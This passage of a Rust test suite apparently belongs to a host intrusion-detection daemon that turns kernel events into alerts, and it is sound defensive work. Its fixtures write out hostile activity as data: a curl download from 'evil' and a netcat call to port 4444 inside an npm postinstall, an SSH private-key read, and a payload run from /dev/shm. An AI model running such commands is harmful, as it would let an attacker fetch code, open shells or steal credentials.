    /// on a sysfs path its own `Prefix` selector cannot produce.
    #[test]
    fn a_kernel_match_its_own_selector_rejects_becomes_a_sensor_mismatch() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        let line = r#"{"process_lsm":{"process":{"exec_id":"zz1","pid":4242,"uid":1000,"binary":"/usr/bin/node","arguments":"server.js","cwd":"/home/dan","start_time":"2026-09-03T16:21:06.900000000Z"},"function_name":"file_post_open","policy_name":"moat-cred-ssh-private-key-read","args":[{"file_arg":{"path":"/sys/devices/system/cpu/online"}},{"int_arg":4}]},"time":"2026-09-03T16:21:07.000Z"}"#;
        d.handle_line(line);

        let alerts = d.store.load();
        assert_eq!(alerts.len(), 1);
        let a = &alerts[0];
        assert_eq!(a.rule, "moat-x-sensor-mismatch");
        assert_eq!(a.severity, "low");
        assert_eq!(a.file.as_ref().unwrap().path, "/sys/devices/system/cpu/online");
        let ev = a.explain.evidence.join("\n");
        assert!(ev.contains("policy: moat-cred-ssh-private-key-read"), "{}", ev);
        assert!(ev.contains("/sys/devices/system/cpu/online"), "{}", ev);
        assert!(ev.contains("matchArgs index 0"), "{}", ev);
        assert!(a.explain.why.contains("should have rejected"));
        assert!(
            !alerts.iter().any(|x| x.rule == "moat-cred-ssh-private-key-read"),
            "the policy alert itself must NOT be raised"
        );
    }

    #[test]
    fn a_path_the_policy_does_name_still_alerts_normally() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        let line = r#"{"process_lsm":{"process":{"exec_id":"zz2","pid":4243,"uid":1000,"binary":"/usr/bin/node","arguments":"x.js","cwd":"/home/dan","start_time":"2026-09-03T16:21:06.900000000Z"},"function_name":"file_post_open","policy_name":"moat-cred-ssh-private-key-read","args":[{"file_arg":{"path":"/home/dan/.ssh/id_ed25519"}},{"int_arg":4}]},"time":"2026-09-03T16:21:07.000Z"}"#;
        d.handle_line(line);
        let rules: Vec<String> = d.store.load().into_iter().map(|a| a.rule).collect();
        assert_eq!(rules, vec!["moat-cred-ssh-private-key-read"]);
    }

    /// `moat-net-suspicious-port-egress` fires for every process at medium;
    /// being inside an install is what makes it high.
    #[test]
    fn suspicious_port_egress_is_escalated_inside_a_package_subtree() {
        fn egress_line(exec_id: &str, pid: u32) -> String {
            format!(
                r#"{{"process_kprobe":{{"process":{{"exec_id":"{}","pid":{},"uid":1000,"binary":"/usr/bin/node","arguments":"install.js","cwd":"/home/dan/proj","start_time":"2026-09-03T16:21:06.900000000Z"}},"function_name":"tcp_connect","policy_name":"{}","args":[{{"sock_arg":{{"family":"AF_INET","daddr":"185.220.101.55","dport":4444,"saddr":"192.168.1.20","sport":51234}}}}]}},"time":"2026-09-03T16:21:07.000Z"}}"#,
                exec_id, pid, SUSPICIOUS_PORT_EGRESS
            )
        }

        // Outside an install: whatever the policy annotations say, unchanged.
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.handle_line(&egress_line("out1", 5000));
        let a = d
            .store
            .load()
            .into_iter()
            .find(|a| a.rule == SUSPICIOUS_PORT_EGRESS)
            .expect("the policy alert is raised for every process");
        // The rule says medium; `/usr/bin/node` is official in the fixture, and
        // `net` is one of the families BASELINE §2 lets provenance soften.
        assert_eq!(a.severity_base, "medium");
        assert_eq!(a.severity, "low");
        assert!(a.severity_reason.contains("actor is official"), "{}", a.severity_reason);
        assert!(!a.explain.evidence.iter().any(|e| e.contains("raised from")));

        // Inside an npm install: high, with the root named.
        let dir2 = tempfile::tempdir().unwrap();
        let (mut d2, _) = dev_daemon(dir2.path());
        d2.handle_line(r#"{"process_exec":{"process":{"exec_id":"e-npm","pid":41201,"uid":1000,"binary":"/usr/bin/npm","arguments":"install","cwd":"/home/dan/proj","start_time":"2026-09-03T16:21:01.000000000Z"}}}"#);
        d2.handle_line(r#"{"process_exec":{"process":{"exec_id":"in1","pid":5001,"uid":1000,"binary":"/usr/bin/node","arguments":"install.js","cwd":"/home/dan/proj","start_time":"2026-09-03T16:21:06.900000000Z","parent_exec_id":"e-npm"}}}"#);
        d2.handle_line(&egress_line("in1", 5001));
        let a = d2
            .store
            .load()
            .into_iter()
            .find(|a| a.rule == SUSPICIOUS_PORT_EGRESS)
            .unwrap();
        // And a package install is never downgraded, however official the actor.
        assert_eq!(a.severity, "high");
        assert_eq!(a.context, crate::context::Context::PkgInstall);
        let ev = a.explain.evidence.join("\n");
        assert!(ev.contains("package-manager subtree root: /usr/bin/npm"), "{}", ev);
        assert!(ev.contains("raised from medium to high"), "{}", ev);
    }

    /// The four rules that replaced the deleted kernel policies work off
    /// `process_exec` alone, so they need no policy to be loaded at all.
    #[test]
    fn the_pkg_subtree_rules_fire_from_exec_events_only() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        for (id, pid, exe, args, parent) in [
            ("x-fish", 41101, "/usr/bin/fish", "", ""),
            ("x-npm", 41201, "/usr/bin/npm", "install", "x-fish"),
            ("x-sh", 41240, "/usr/bin/sh", "-c postinstall", "x-npm"),
            ("x-curl", 41241, "/usr/bin/curl", "-sL https://evil/x", "x-sh"),
            ("x-nc", 41242, "/usr/bin/nc", "1.2.3.4 4444", "x-sh"),
            ("x-cli", 41243, "/usr/bin/claude", "-p fix", "x-sh"),
        ] {
            d.handle_line(&format!(
                r#"{{"process_exec":{{"process":{{"exec_id":"{}","pid":{},"uid":1000,"binary":"{}","arguments":"{}","cwd":"/home/dan/proj","start_time":"2026-09-03T16:21:06.900000000Z"{}}}}}}}"#,
                id,
                pid,
                exe,
                args,
                if parent.is_empty() {
                    String::new()
                } else {
                    format!(r#","parent_exec_id":"{}""#, parent)
                }
            ));
        }
        let mut rules: Vec<String> = d.store.load().into_iter().map(|a| a.rule).collect();
        rules.sort();
        assert_eq!(
            rules,
            vec![
                "moat-ai-cli-in-pkg-subtree",
                "moat-pkg-subtree-downloader",
                "moat-pkg-subtree-interpreter-spawn",
                "moat-pkg-subtree-netcat-exec",
                // The shell above the agent is npm's, not a person's, so the
                // headless rule speaks up as well. Two rules, two angles.
                "moat-x-ai-cli-headless",
            ]
        );
        // Monitor mode never kills, whatever the rule asked for.
        assert!(d.store.load().iter().all(|a| a.action_taken == "none"));
    }

    /// Spawn a freshly copied binary, retrying `ETXTBSY`.
    ///
    /// `fs::copy` in one test thread and `fork+exec` in another race: the child
    /// inherits the still-open write descriptor and the kernel refuses the
    /// exec. Nothing to do with the daemon, everything to do with running the
    /// suite in parallel.
    fn spawn_retrying_etxtbsy(path: &Path) -> std::process::Child {
        for _ in 0..50 {
            match std::process::Command::new(path).arg("30").spawn() {
                Ok(c) => return c,
                Err(e) if e.raw_os_error() == Some(libc::ETXTBSY) => {
                    std::thread::sleep(Duration::from_millis(20));
                }
                Err(e) => panic!("spawn {}: {}", path.display(), e),
            }
        }
        panic!("{} stayed busy", path.display())
    }

    /// Spawn the victim **and prove /proc still names it**, returning the
    /// process, its pid, its start time in Tetragon's format and its exe.
    ///
    /// The proof matters: this test process runs dozens of threads, pids are
    /// recycled, and a child that lost the race would otherwise be described to
    /// the daemon under some other program's name — which is a broken test, not
    /// a broken rule.
    fn spawn_victim(path: &Path) -> (std::process::Child, u32, String, String) {
        for _ in 0..20 {
            let child = spawn_retrying_etxtbsy(path);
            let pid = child.id();
            let exe = util::proc_exe(pid);
            let start = util::proc_start_nanos(pid);
            match (exe, start) {
                (Some(exe), Some(start)) if Path::new(&exe) == path => {
                    let ts = chrono::DateTime::from_timestamp(
                        (start / 1_000_000_000) as i64,
                        (start % 1_000_000_000) as u32,
                    )
                    .expect("a start time inside the epoch")
                    .format("%Y-%m-%dT%H:%M:%S%.9fZ")
                    .to_string();
                    return (child, pid, ts, exe);
                }
                _ => {
                    let mut child = child;
                    let _ = child.kill();
                    let _ = child.wait();
                }
            }
        }
        panic!("{} never stayed alive long enough to be observed", path.display())
    }

    /// Enforce mode kills the netcat itself — verified against a real process,
    /// because "we verified the start time" is the whole point.
    #[test]
    fn enforce_mode_kills_a_netcat_and_records_it() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.mode = "enforce".into();

        // A real process whose basename the rule matches: `sleep`, copied to
        // `<tmp>/nc`. Nothing here is faked — /proc is the witness.
        let Some(src) = ["/usr/bin/sleep", "/bin/sleep"]
            .iter()
            .map(Path::new)
            .find(|p| p.exists())
        else {
            return;
        };
        let victim = dir.path().join("nc");
        std::fs::copy(src, &victim).unwrap();
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&victim, std::fs::Permissions::from_mode(0o755)).unwrap();
        }

        let (mut child, pid, ts, exe) = spawn_victim(&victim);

        d.handle_line(r#"{"process_exec":{"process":{"exec_id":"k-npm","pid":41201,"uid":1000,"binary":"/usr/bin/npm","arguments":"install","start_time":"2026-09-03T16:21:01.000000000Z"}}}"#);
        d.handle_line(&format!(
            r#"{{"process_exec":{{"process":{{"exec_id":"k-nc","pid":{},"uid":1000,"binary":"{}","arguments":"1.2.3.4 4444","start_time":"{}","parent_exec_id":"k-npm"}}}}}}"#,
            pid, exe, ts
        ));

        let a = d
            .store
            .load()
            .into_iter()
            .find(|a| a.rule == "moat-pkg-subtree-netcat-exec")
            .expect("nc inside an npm install is critical");
        assert_eq!(a.severity, "critical");
        assert_eq!(a.action_taken, "killed");
        assert!(a.explain.evidence.iter().any(|e| e.contains("sent SIGKILL")), "{:?}", a.explain.evidence);

        use std::os::unix::process::ExitStatusExt;
        let status = child.wait().unwrap();
        assert_eq!(status.signal(), Some(libc::SIGKILL), "the process was actually killed");

        // Same event in monitor mode: nothing dies.
        let dir2 = tempfile::tempdir().unwrap();
        let (mut d2, _) = dev_daemon(dir2.path());
        let victim2 = dir2.path().join("nc");
        std::fs::copy(src, &victim2).unwrap();
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&victim2, std::fs::Permissions::from_mode(0o755)).unwrap();
        }
        let (mut child2, pid2, ts2, exe2) = spawn_victim(&victim2);
        d2.handle_line(r#"{"process_exec":{"process":{"exec_id":"k-npm","pid":41201,"uid":1000,"binary":"/usr/bin/npm","arguments":"install","start_time":"2026-09-03T16:21:01.000000000Z"}}}"#);
        d2.handle_line(&format!(
            r#"{{"process_exec":{{"process":{{"exec_id":"k-nc","pid":{},"uid":1000,"binary":"{}","arguments":"1.2.3.4 4444","start_time":"{}","parent_exec_id":"k-npm"}}}}}}"#,
            pid2, exe2, ts2
        ));
        let a2 = d2
            .store
            .load()
            .into_iter()
            .find(|a| a.rule == "moat-pkg-subtree-netcat-exec")
            .unwrap_or_else(|| panic!("no netcat alert for pid {}", pid2));
        assert_eq!(a2.action_taken, "none", "monitor mode never kills");
        assert!(std::path::Path::new(&format!("/proc/{}", pid2)).exists());
        let _ = child2.kill();
        let _ = child2.wait();
    }

    /// A binary executed from a file descriptor has no name in the kernel. The
    /// alert must not just say `/proc/self/fd/9` and stop.
    #[test]
    fn a_proc_self_fd_binary_is_resolved_and_the_substitution_is_evidence() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());

        // Route 1: the hook carries the exec'd file (linux_binprm).
        d.handle_line(r#"{"process_exec":{"process":{"exec_id":"f-sh","pid":700,"uid":1000,"binary":"/usr/bin/sh","arguments":"/tmp/.x9k --quiet","start_time":"2026-09-03T16:20:00.000000000Z"}}}"#);
        d.handle_line(r#"{"process_lsm":{"process":{"exec_id":"f-fd","pid":701,"uid":1000,"binary":"/proc/self/fd/9","arguments":"","cwd":"/tmp","start_time":"2026-09-03T16:21:00.000000000Z","parent_exec_id":"f-sh"},"function_name":"bprm_check_security","policy_name":"moat-exec-untrusted-tmpfs","args":[{"linux_binprm_arg":{"path":"/dev/shm/payload"}}]},"time":"2026-09-03T16:21:00.100Z"}"#);

        let a = d.store.load().into_iter().next().expect("one alert");
        assert_eq!(a.process.exe, "/dev/shm/payload");
        let note = a
            .explain
            .evidence
            .iter()
            .find(|e| e.contains("/proc/self/fd/9"))
            .expect("the substitution must be evidence");
        assert!(note.contains("exec'd-file argument"), "{}", note);

        // Route 2: no hook argument, so the parent's argument 0 is used.
        let dir2 = tempfile::tempdir().unwrap();
        let (mut d2, _) = dev_daemon(dir2.path());
        d2.handle_line(r#"{"process_exec":{"process":{"exec_id":"g-sh","pid":800,"uid":1000,"binary":"/usr/bin/sh","arguments":"/tmp/.x9k --quiet","start_time":"2026-09-03T16:20:00.000000000Z"}}}"#);
        d2.handle_line(r#"{"process_exec":{"process":{"exec_id":"g-fd","pid":801,"uid":1000,"binary":"/proc/self/fd/9","arguments":"","cwd":"/tmp","start_time":"2026-09-03T16:21:00.000000000Z","parent_exec_id":"g-sh"}}}"#);
        assert_eq!(d2.table.get("g-fd").unwrap().exe, "/tmp/.x9k");
        assert!(d2
            .table
            .get("g-fd")
            .unwrap()
            .exe_note
            .as_ref()
            .unwrap()
            .contains("parent's argument 0"));
    }

    #[test]
    fn status_has_every_contract_field() {
        let dir = tempfile::tempdir().unwrap();
        let (d, _) = dev_daemon(dir.path());
        let s = d.status();
        for k in [
            "ok", "version", "mode", "tetragon", "policies", "policies_failed", "feeds",
            "unacked", "sandbox", "socket_group",
        ] {
            assert!(s.get(k).is_some(), "status missing {}", k);
        }
        assert_eq!(s["socket_group"], "moat");
        assert!(s["unacked"].get("critical").is_some());
    }

    #[test]
    fn state_json_is_written_and_mode_survives_a_restart() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, cfg) = dev_daemon(dir.path());
        d.mode = "enforce".into();
        d.write_state();
        assert!(cfg.paths.state_file().exists());
        let d2 = Daemon::new(cfg.clone(), &dir.path().join("moat.toml")).unwrap();
        assert_eq!(d2.mode, "enforce");
    }

    // ================================================================
    // Baselining (docs/BASELINE.md, docs/LEARNING-AND-ANALYSIS.md §1)
    // ================================================================

    /// One exec line, with the parent already in the table.
    fn exec_line(id: &str, pid: u32, exe: &str, args: &str, parent: &str) -> String {
        format!(
            r#"{{"process_exec":{{"process":{{"exec_id":"{}","pid":{},"uid":1000,"binary":"{}","arguments":"{}","cwd":"/home/dan/proj","start_time":"2026-09-03T16:21:06.900000000Z"{}}}}}}}"#,
            id,
            pid,
            exe,
            args,
            if parent.is_empty() {
                String::new()
            } else {
                format!(r#","parent_exec_id":"{}""#, parent)
            }
        )
    }

    fn read_line(id: &str, pid: u32, exe: &str, args: &str, parent: &str, policy: &str, path: &str) -> String {
        format!(
            r#"{{"process_lsm":{{"process":{{"exec_id":"{}","pid":{},"uid":1000,"binary":"{}","arguments":"{}","cwd":"/home/dan/proj","start_time":"2026-09-03T16:21:06.900000000Z","parent_exec_id":"{}"}},"function_name":"file_post_open","policy_name":"{}","args":[{{"file_arg":{{"path":"{}"}}}},{{"int_arg":4}}]}},"time":"2026-09-03T16:21:07.000Z"}}"#,
            id, pid, exe, args, parent, policy, path
        )
    }

    #[test]
    fn every_alert_carries_actor_context_rarity_and_a_surface() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        replay(&mut d);
        for a in d.store.load() {
            assert!(!a.severity_base.is_empty(), "{} has no severity_base", a.rule);
            assert!(!a.severity_reason.is_empty(), "{} has no severity_reason", a.rule);
            assert!(
                a.surface == "alerts" || a.surface == "timeline",
                "{} has surface {:?}",
                a.rule,
                a.surface
            );
            assert!(!a.rarity_text.is_empty(), "{} has no rarity sentence", a.rule);
            // BASELINE §5: only high and critical reach the Alerts tab.
            if a.surface == "alerts" {
                assert!(a.severity_rank() >= 2, "{} is {} on the Alerts tab", a.rule, a.severity);
                // ...and nothing already answered for reaches it at all. The
                // recorded surface is the only thing a reader working from
                // alerts.jsonl alone has (an offline audit, the setup screen),
                // so it has to agree with what the UI shows rather than relying
                // on every consumer to recompute it.
                assert!(
                    a.suppressed_by.is_none(),
                    "{} is suppressed by {:?} but recorded on the Alerts tab",
                    a.rule,
                    a.suppressed_by
                );
            }
            let ev = a.explain.evidence.join("\n");
            assert!(ev.contains("actor: "), "{} has no actor evidence", a.rule);
            assert!(ev.contains("context: "), "{} has no context evidence", a.rule);
            assert!(ev.contains("rarity: "), "{} has no rarity evidence", a.rule);
        }
    }

    /// The interpreter rule, end to end: official `/usr/bin/sh` running a
    /// dropped script is a `user` actor, so nothing is softened.
    #[test]
    fn an_interpreter_takes_its_provenance_from_the_script_it_was_handed() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.handle_line(&exec_line("e-term", 100, "/usr/bin/alacritty", "", ""));
        d.handle_line(&exec_line("e-sh", 101, "/usr/bin/sh", "/home/dan/proj/setup.sh", "e-term"));
        d.handle_line(&read_line(
            "e-sh",
            101,
            "/usr/bin/sh",
            "/home/dan/proj/setup.sh",
            "e-term",
            "moat-cred-ssh-private-key-read",
            "/home/dan/.ssh/id_ed25519",
        ));
        let a = d
            .store
            .load()
            .into_iter()
            .find(|a| a.rule == "moat-cred-ssh-private-key-read")
            .expect("an alert");
        assert_eq!(a.actor.provenance, crate::provenance::Provenance::User);
        assert_eq!(a.actor.script.as_deref(), Some("/home/dan/proj/setup.sh"));
        assert!(a.actor.package.is_none());
        // And the timeline groups on the script, not on /usr/bin/sh.
        assert_eq!(a.group_key(), "/home/dan/proj/setup.sh");
        // cred never earns a provenance downgrade; interactive takes one step.
        assert_eq!(a.context, crate::context::Context::Interactive);
        assert_eq!(a.severity_base, "high");
        assert_eq!(a.severity, "medium");
    }

    #[test]
    fn rarity_moves_from_first_seen_to_common_as_the_same_thing_recurs() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.cfg.thresholds.dedupe_secs = 0; // one alert per event, not one per minute
        d.handle_line(&exec_line("e-term", 100, "/usr/bin/alacritty", "", ""));
        for i in 0..5 {
            d.handle_line(&read_line(
                "e-restic",
                200 + i,
                "/usr/bin/restic",
                "backup",
                "e-term",
                "moat-cred-ssh-private-key-read",
                "/home/dan/.ssh/id_ed25519",
            ));
        }
        // ULIDs minted in the same millisecond are not ordered among
        // themselves, so assert on the set rather than on the sequence.
        let alerts: Vec<Alert> = d
            .store
            .load()
            .into_iter()
            .filter(|a| a.rule == "moat-cred-ssh-private-key-read")
            .collect();
        assert_eq!(alerts.len(), 5, "dedupe is off for this test");
        let seen: Vec<&str> = alerts.iter().map(|a| a.rarity.as_str()).collect();
        assert_eq!(seen.iter().filter(|r| **r == "first_seen").count(), 1);
        assert!(seen.contains(&"rare"));
        assert!(seen.contains(&"common"), "{:?}", seen);
        // The sentence names the actor and the place, in words.
        let common = alerts.iter().find(|a| a.rarity.is_common()).unwrap();
        assert!(common.rarity_text.contains("/usr/bin/restic has read /home/dan/.ssh"), "{}", common.rarity_text);
        assert!(common.rarity_text.contains("seen "), "{}", common.rarity_text);
        let first = alerts.iter().find(|a| a.rarity == crate::rarity::Rarity::FirstSeen).unwrap();
        assert!(first.rarity_text.starts_with("first time "), "{}", first.rarity_text);
        assert!(!d.rarity.is_empty(), "the (actor, file dir) tuple is counted");
    }

    /// Feed the same official, medium pattern on three distinct days and it
    /// lands in baseline.toml and starts suppressing itself.
    #[test]
    fn the_learning_window_writes_a_baseline_entry_and_it_takes_effect() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, cfg) = dev_daemon(dir.path());
        d.cfg.thresholds.dedupe_secs = 0;
        assert!(d.baseline.learning(util::unix_secs()));

        // `restic` is official in the fixture, so a medium cred read from it is
        // exactly the shape §3 learns. A unit test cannot wait three days, so
        // the tuple's day list is back-dated between emissions; everything else
        // (rarity, provenance, severity, the write) is the real path.
        let path = cfg.paths.baseline_allowlist();
        let key = crate::baseline::tuple_key(
            "moat-cred-ssh-private-key-read",
            "/usr/bin/restic",
            "",
            "/home/dan/.ssh",
        );
        let restic_read = || {
            let mut f = Finding::new(
                "moat-cred-ssh-private-key-read",
                crate::policy::PolicyMeta::fallback("moat-cred-ssh-private-key-read"),
                ProcInfo {
                    exec_id: "e-restic".into(),
                    pid: 300,
                    uid: 0,
                    exe: "/usr/bin/restic".into(),
                    args: "backup".into(),
                    cwd: "/".into(),
                    start_time: util::now_rfc3339(),
                    parent_exec_id: None,
                    exited_at: None,
                    exit_signal: None,
                    exe_note: None,
                },
            );
            f.meta.family = "cred".into();
            f.meta.severity = "medium".into();
            f.hook = "file_post_open".into();
            f.hook_detail = Some("read".into());
            f.file = Some(crate::alert::FileRef {
                path: "/home/dan/.ssh/id_ed25519".into(),
                sha256: None,
            });
            f
        };
        // Three sightings: still `rare`, and only one distinct day.
        for _ in 0..3 {
            d.emit(restic_read());
        }
        assert!(!path.exists(), "not yet: one day, and the tuple is still rare");
        // Back-date two earlier days; the next sighting is the third distinct
        // day and the fourth sighting, which makes the tuple `common`.
        d.baseline.state.tuples.get_mut(&key).unwrap().days =
            vec!["2026-08-01".into(), "2026-08-02".into()];
        d.emit(restic_read());
        assert!(path.exists(), "baseline.toml must have been written");
        let text = std::fs::read_to_string(&path).unwrap();
        assert!(text.contains("# learned "), "{}", text);
        assert!(text.contains("3 distinct days"), "{}", text);
        assert!(text.contains("moat-cred-ssh-private-key-read"), "{}", text);
        assert!(text.contains("file = \"/home/dan/.ssh/*\""), "{}", text);
        assert_eq!(d.baseline.learned_entries().len(), 1);

        // It is live: the next identical event is recorded as suppressed.
        d.reload_allowlist();
        let n = d.alerts_suppressed;
        d.handle_line(&read_line(
            "e-r2",
            301,
            "/usr/bin/restic",
            "backup",
            "",
            "moat-cred-ssh-private-key-read",
            "/home/dan/.ssh/id_ed25519",
        ));
        assert!(d.alerts_suppressed > n, "the learned entry suppresses it");
        let last = d.store.load().into_iter().next_back().unwrap();
        assert_eq!(last.suppressed_by.as_deref(), Some("baseline.toml#1"));
    }

    /// After the window the same pattern is a proposal in state.json instead.
    #[test]
    fn after_the_window_a_recurring_pattern_shows_up_in_status_as_a_proposal() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.baseline.state.learning_until = 1; // the window is long closed
        let now = util::unix_secs();
        for day in 0..3u64 {
            d.baseline.observe(&Observation {
                rule: "moat-persist-hypr-config-write",
                exe: "/usr/bin/restic",
                parent: "/usr/bin/Hyprland",
                dir: "/home/dan/.config/hypr",
                severity: "low",
                provenance: "official",
                package: Some("restic 0.18.1-1".into()),
                context: "service",
                rarity: "common",
                suppressed: false,
                demoted: false,
                ts: format!("2026-09-0{}T10:00:00.000Z", day + 1),
                now,
            });
        }
        let s = d.status();
        assert_eq!(s["baseline"]["learning"], false);
        assert_eq!(s["baseline"]["proposals"], 1);
        let p = &s["proposals"][0];
        for k in ["id", "rule", "exe", "parent", "dir", "count", "days", "first_seen", "last_seen", "toml"] {
            assert!(p.get(k).is_some(), "proposal has no {}", k);
        }
        assert_eq!(p["days"], 3);
        assert!(p["toml"].as_str().unwrap().contains("[[rule]]"));
    }

    /// BASELINE §4: a flooding rule is demoted, one alert explains it, and the
    /// demoted alerts stay on the timeline **without** being suppressed.
    #[test]
    fn a_flooding_rule_is_demoted_and_says_so_exactly_once() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.cfg.thresholds.dedupe_secs = 0;
        d.handle_line(&exec_line("e-hypr", 1, "/usr/bin/Hyprland", "", ""));
        for i in 0..25u32 {
            d.handle_line(&read_line(
                &format!("e-w{}", i),
                400 + i,
                "/usr/bin/restic",
                "backup",
                "e-hypr",
                "moat-persist-hypr-config-write",
                &format!("/home/dan/.config/hypr/gen{}.conf", i % 4),
            ));
        }
        assert!(d.baseline.is_demoted("moat-persist-hypr-config-write"));
        assert_eq!(
            d.status()["demoted_rules"].as_array().unwrap().len(),
            1,
            "demoted_rules is a top-level status field"
        );

        let alerts = d.store.load();
        let noisy: Vec<_> = alerts
            .iter()
            .filter(|a| a.rule == crate::rules::NOISY_RULE)
            .collect();
        assert_eq!(noisy.len(), 1, "one alert about the flood, not one per alert");
        let n = noisy[0];
        assert_eq!(n.severity, "medium");
        assert!(n.explain.evidence.iter().any(|e| e.starts_with("top 1: ")));
        let scopes: Vec<&str> = n.explain.if_expected.options.iter().map(|o| o.scope.as_str()).collect();
        assert!(scopes.contains(&"these-are-expected"), "{:?}", scopes);
        assert!(scopes.contains(&"keep-watching"), "{:?}", scopes);
        let expected = n
            .explain
            .if_expected
            .options
            .iter()
            .find(|o| o.scope == "these-are-expected")
            .unwrap();
        assert!(expected.line.contains("moat-persist-hypr-config-write"));
        assert!(n
            .explain
            .if_expected
            .options
            .iter()
            .any(|o| o.cmd.contains("baseline undemote moat-persist-hypr-config-write")));

        // Later alerts of the demoted rule: timeline, but NOT suppressed.
        d.handle_line(&read_line(
            "e-after",
            999,
            "/usr/bin/restic",
            "backup",
            "e-hypr",
            "moat-persist-hypr-config-write",
            "/home/dan/.config/hypr/after.conf",
        ));
        let last = d
            .store
            .load()
            .into_iter()
            .rfind(|a| a.rule == "moat-persist-hypr-config-write")
            .unwrap();
        assert_eq!(last.surface, "timeline");
        assert_eq!(last.suppressed_by, None, "a demoted rule is not a suppression");
        assert!(last.explain.evidence.iter().any(|e| e.contains("noise guard")));
    }

    /// LEARNING §1: a learned entry whose actor stops being official is
    /// disabled in place, with a reason and a low alert.
    #[test]
    fn a_learned_entry_is_revoked_when_its_actor_stops_being_official() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, cfg) = dev_daemon(dir.path());

        // A private copy of the pacman fixture we can mutate.
        let local = dir.path().join("pacman-local");
        let src = Path::new(env!("CARGO_MANIFEST_DIR")).join("testdata/pacman-local");
        std::fs::create_dir_all(&local).unwrap();
        for e in std::fs::read_dir(&src).unwrap().flatten() {
            let d2 = local.join(e.file_name());
            std::fs::create_dir_all(&d2).unwrap();
            for f in ["desc", "files"] {
                std::fs::copy(e.path().join(f), d2.join(f)).unwrap();
            }
        }
        d.cfg.paths.pacman_local = local.clone();
        d.provenance = crate::provenance::Classifier::new(
            &local,
            &d.cfg.baseline.trusted_repos,
            &d.homes,
            Box::new(PacmanSl { bin: cfg.paths.pacman.clone() }),
        );
        assert!(d.provenance.classify_path("/usr/bin/restic").0.is_official());

        // Learn an entry for it.
        let now = util::unix_secs();
        for day in 0..3u64 {
            d.baseline.observe(&Observation {
                rule: "moat-cred-ssh-private-key-read",
                exe: "/usr/bin/restic",
                parent: "",
                dir: "/home/dan/.ssh",
                severity: "medium",
                provenance: "official",
                package: Some("restic 0.18.1-1".into()),
                context: "service",
                rarity: "common",
                suppressed: false,
                demoted: false,
                ts: format!("2026-09-0{}T10:00:00.000Z", day + 1),
                now,
            });
        }
        let entry = d.baseline.learned_entries();
        assert_eq!(entry.len(), 1);
        let t = d.baseline.state.tuples.get(&entry[0].key).unwrap().clone();
        let path = d.cfg.paths.baseline_allowlist();
        crate::allowlist::append_rule(&path, &t.comment("learned"), &t.spec()).unwrap();
        d.reload_allowlist();
        assert_eq!(d.allowlist.len(), 1);

        // Now `restic` is rebuilt from the AUR: same package name, no repo, no
        // validation. A pacman transaction moved the directory's mtime.
        std::fs::write(
            local.join("restic-0.18.1-1/desc"),
            "%NAME%\nrestic\n\n%VERSION%\n0.18.1-1\n\n%VALIDATION%\nnone\n",
        )
        .unwrap();
        d.provenance.refresh_if_changed();
        // Force the mtime check to fire regardless of filesystem granularity.
        d.provenance = crate::provenance::Classifier::new(
            &local,
            &d.cfg.baseline.trusted_repos,
            &d.homes,
            Box::new(PacmanSl { bin: cfg.paths.pacman.clone() }),
        );
        assert_eq!(
            d.provenance.classify_path("/usr/bin/restic").0,
            crate::provenance::Provenance::Foreign
        );
        // on_pacman_change only acts on a real mtime move, so drive the check.
        let revoked = d.revoke_stale_learned_entries();
        assert_eq!(revoked, 1);

        let text = std::fs::read_to_string(&path).unwrap();
        assert!(text.contains("# DISABLED"), "{}", text);
        assert!(text.contains("no longer official"), "{}", text);
        d.reload_allowlist();
        assert_eq!(d.allowlist.len(), 0, "the entry stopped matching");
        assert!(d.baseline.learned_entries().is_empty());

        let a = d
            .store
            .load()
            .into_iter()
            .find(|a| a.rule == crate::rules::BASELINE_REVOKED)
            .expect("a low alert says why");
        assert_eq!(a.severity, "low");
        assert!(a.explain.what.contains("no longer shipped by a trusted repository"));
    }

    /// BASELINE §8: a suppressed alert still folds and still gets its `count`
    /// updates, so the timeline shows one greyed row with a number rather than
    /// a thousand of them — or nothing at all.
    #[test]
    fn dedupe_and_count_updates_still_work_for_suppressed_alerts() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, cfg) = dev_daemon(dir.path());
        std::fs::write(
            cfg.paths.allowlist_dir.join("user.toml"),
            "# expected\n[[rule]]\nname = \"moat-cred-ssh-private-key-read\"\nexe = \"/usr/bin/restic\"\n",
        )
        .unwrap();
        d.reload_allowlist();
        let line = read_line(
            "e-restic",
            700,
            "/usr/bin/restic",
            "backup",
            "",
            "moat-cred-ssh-private-key-read",
            "/home/dan/.ssh/id_ed25519",
        );
        for _ in 0..5 {
            d.handle_line(&line);
        }
        let alerts: Vec<Alert> = d
            .store
            .load()
            .into_iter()
            .filter(|a| a.rule == "moat-cred-ssh-private-key-read")
            .collect();
        assert_eq!(alerts.len(), 1, "one folded row, not five");
        assert_eq!(alerts[0].count, Some(5), "the count updates still land");
        assert_eq!(alerts[0].suppressed_by.as_deref(), Some("user.toml#1"));
        assert_eq!(d.store.unacked()["high"], 0, "and none of it is counted");
        // Rarity kept learning through all five, suppressed or not.
        assert_eq!(
            d.rarity
                .peek(&Tuple::file("/usr/bin/restic", "/home/dan/.ssh/id_ed25519", "read"), util::unix_secs())
                .total,
            5
        );
    }

    #[test]
    fn status_carries_the_shapes_the_plugin_builds_against() {
        let dir = tempfile::tempdir().unwrap();
